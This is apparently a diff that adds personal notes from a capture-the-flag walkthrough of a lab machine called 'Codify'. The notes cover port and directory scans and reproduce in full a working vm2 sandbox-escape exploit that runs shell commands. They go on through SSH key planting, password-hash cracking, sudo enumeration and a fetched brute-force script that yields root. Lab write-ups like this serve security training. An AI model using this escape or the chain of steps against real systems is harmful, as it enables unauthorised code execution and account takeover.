@@ -1,0 +1,86 @@
+Open ports
+	22/tcp ssh
+	80/tcp http
+	3000/tcp ppp
+
+22/tcp ssh
+	OpenSSH 8.9p1 Ubuntu
+80/tcp http
+	Apache httpd 2.4.52
+3000/tcp http
+	node.js Express
+	http-title: Codify
+
+OS guess 97% chance of Linux 5.0
+
+running a gobuster script to look for other directories
+gobuster dir -u http:\\codify.htb/ -w /usr/share/wordlists/dirb/big.txt
+	/about
+	/About
+	/editor
+	/server-status (403)
+
+attempting a reverse shell under .js format
+	child_process is not allowed
+	trying some other shell scripts in .js
+	no luck
+
+intercepting traffic using burpsuite
+end up with one POST request being sent to the server
+code is encoded to base64
+
+reading through the website, they are using vm2 technology
+there is an exploit with this technology for sandbox outbreak
+I am able to use the exploit below to run commands in the editor webpage
+----------
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+cmd = 'id'
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
+}
+`
+console.log(vm.run(code));
+---------
+Attempting several types of shells via python, ruby, c, sh, none are functional
+I will now attempt to upload my Kali Box's ssh key to the machine using this method
+	First, I have to generate my ssh key with ssh-keygen
+	created the key and began fiddling with the above mentioned code to upload this into ~/.ssh/authorized_keys
+	
+doing a cat out for /etc/passwd, we find the user Joshua
+
+looking all through the file system, we find /var/www/contact/tickets.db
+This seems to have an encrypted password for the user Joshua, running this through John The Ripper using rockyou.txt
+We get the decrypted password of "spongebob1"!
+Let's try to ssh into the host using joshua@codify.htb:spongebob1
+
+We're in!
+
+We arrive to Joshua's home directory and instantly get the user.txt flag
+We are unable to cd into the /root directory however
+running sudo -l, joshua may run the following commands on codify: root /opt/scripts/mysql-backup.sh
+
+I move into the /tmp directory and am attempting a password dump via python from https://github.com/learnpentest/pythonbrute/blob/main/brute.py
+
+I get "kljh12k3jhaskjh12kjh3", let's try to log in as root on the off chance this works
+
+ssh root@codify.htb:kljh12k3jhaskjh12kjh3, this fails
+however, from the existing ssh session with Joshua, we can su there.  There is likely no root ssh login enabled
+
+We are in as root!
+We can now cat out /root/root.txt
